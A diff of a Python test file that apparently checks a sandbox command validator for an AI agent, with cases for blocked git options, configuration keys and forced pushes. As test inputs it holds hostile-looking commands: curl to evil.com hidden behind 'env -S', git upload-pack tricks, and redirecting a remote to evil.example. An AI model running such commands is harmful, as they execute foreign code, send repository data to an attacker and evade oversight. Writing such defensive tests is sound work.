@@ -590,10 +590,35 @@ def test_ripgrep_and_srt_availability() -> None:
         ("env -S 'curl http://evil.com'", "'env -S/--split-string' is blocked"),
         ("env --split-string 'curl http://evil.com'", "'env -S/--split-string' is blocked"),
         # --- Git hardening ---
-        ("git --upload-pack=evil clone url", "Git flag '--upload-pack' is blocked"),
-        ("git --receive-pack=evil push", "Git flag '--receive-pack' is blocked"),
-        ("git -c protocol.ext.allow=always clone url", "Git config 'protocol.ext.allow' is blocked"),
-        ("git -c remote.origin.uploadpack=evil fetch", "Git config 'remote.' is blocked"),
+        ("git --upload-pack=evil clone url", "Git option '--upload-pack' is blocked"),
+        ("git --receive-pack=evil push", "Git option '--receive-pack' is blocked"),
+        ("git -c protocol.ext.allow=always clone url", "Git configuration key 'protocol.ext.allow' is blocked"),
+        ("git -c remote.origin.uploadpack=evil fetch", "Git configuration key 'remote.' is blocked"),
+        # A key blocked via '-c' but reachable via 'config' is not blocked at
+        # all; both routes reach the same setting.
+        ("git config remote.origin.url https://evil.example", "Git configuration key 'remote.' is blocked"),
+        ("git config protocol.ext.allow always", "Git configuration key 'protocol.ext.allow' is blocked"),
+        # --- Forced pushes discard commits nobody agreed to lose ---
+        ("git push origin main", None),
+        ("git push origin pr-51:dependabot/pip/faker", None),
+        ("git push -f origin main", "Forced push"),
+        ("git push --force origin main", "Forced push"),
+        ("git push --force-with-lease origin main", "Forced push"),
+        ("git push --force-with-lease=main:abc123 origin main", "Forced push"),
+        ("git push --force-if-includes origin main", "Forced push"),
+        ("git push origin +main:main", "Forced push"),
+        ("git -C /tmp/repo push -f origin main", "Forced push"),
+        ("env GIT_TERMINAL_PROMPT=0 git push -f origin main", "Forced push"),
+        ("git push -qf origin main", "Forced push"),
+        ("git status && git push -f origin main", "Forced push"),
+        # Flags that merely look like a force must still get through.
+        ("git push -u origin main", None),
+        ("git push --set-upstream origin main", None),
+        # A force flag on anything other than a push is the agent's own business.
+        ("git checkout -f main", None),
+        ("git clean -f", None),
+        # '+' inside a message or a non-refspec argument must not read as a force.
+        ("git commit -m '+1 fix'", None),
         # --- Command substitution in argument value: allowed (srt quoter escapes it) ---
         ("echo '$(whoami)'", None),
     ],
